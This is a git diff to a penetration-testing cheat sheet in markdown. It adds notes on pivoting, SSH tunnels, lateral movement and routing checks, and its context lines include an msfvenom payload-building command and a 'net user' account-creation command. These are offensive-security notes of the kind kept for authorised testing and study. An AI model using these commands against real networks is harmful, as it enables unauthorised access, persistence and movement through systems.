@@ -53,6 +53,8 @@ net user <user> <pass> /add
 msfvenom -a <arch> --platform <os> -x <name>.<ext> -k -p windows/messagebox lhost=<ip> -b "\x00" -f exe -o <final_name>.<ext>
 ```
 ## Pivoting
+*Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective.*
+
 
 SSH proxy through a compromised machine
 ```
@@ -66,6 +68,41 @@ Other tools that can be used are [sshuttle](https://github.com/sshuttle/sshuttle
 ```
 sshuttle -r <root>@<proxy ip> <new network>/<CIDR> --ssh-cmd "ssh -i proxy"
 ```
+SSH Tunnel
+```
+ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>
+```
+
+Use Bloodhound and tools like [draw.io](https://draw.io/)
+
+Port Forwarding
+Protocols
+- SOCKS
+- SSH
+- 
+## Lateral Movement
+*Used to further our access to additional hosts, applications, and services within a network environment*
+Check routing 
+```
+netstat -r
+```
+```
+ip route
+```
+*Genmask (generality mask): The netmask for the destination net*
+
+## Tunneling
+*These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.*
+Network Interfaces
+
+| Int Name | Use                                |
+| -------- | ---------------------------------- |
+| eth      | Classic, unpredictable             |
+| eno      | Firmware/BIOS indexed              |
+| ens      | Firmware/BIOS indexed PCIE Hotplug |
+| enXs     | Physical location of connector     |
+| enx      | Name incorporating a MAC address   |
+
 
 ## Linux Privilege Escalation 
 Identify Weakness
